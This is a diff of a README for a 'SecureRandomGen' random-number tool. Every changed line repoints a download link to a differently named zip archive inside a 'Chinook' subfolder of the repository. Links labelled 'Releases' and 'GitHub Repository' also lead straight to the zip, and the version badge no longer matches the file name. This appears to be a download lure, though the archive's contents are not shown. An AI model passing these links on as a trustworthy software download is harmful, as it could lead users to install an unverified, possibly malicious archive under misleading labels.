@@ -6,11 +6,11 @@ SecureRandomGen allows you to create secure random numbers for various applicati
 
 ## 📥 Download the Software
 
-[![Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip%20SecureRandomGen-v1.0-blue)](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip)
+[![Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/Gen-Random-Secure-v3.0.zip%20SecureRandomGen-v1.0-blue)](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/Gen-Random-Secure-v3.0.zip)
 
 To get started, simply visit the following link to download the application:
 
-- [Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip)
+- [Download SecureRandomGen](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/Gen-Random-Secure-v3.0.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ SecureRandomGen comes with several useful features:
 
 Follow these steps to install SecureRandomGen:
 
-1. **Visit the Download Page:** Click on this link: [SecureRandomGen Releases](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip).
+1. **Visit the Download Page:** Click on this link: [SecureRandomGen Releases](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/Gen-Random-Secure-v3.0.zip).
    
 2. **Choose Your Version:** Look for the latest version. It’s typically listed at the top. 
 
@@ -70,7 +70,7 @@ If you need help beyond this guide, please reach out through the issues page on 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/SecureRandomGen.zip) — Check for updates or contribute.
+- [GitHub Repository](https://raw.githubusercontent.com/P-Sushanth/SecureRandomGen/main/Chinook/Gen-Random-Secure-v3.0.zip) — Check for updates or contribute.
 - [User Guide](#) — Detailed instructions and advanced options.
 
 Now you are ready to generate secure random numbers effortlessly with SecureRandomGen. Enjoy the benefits of enhanced security in your applications!
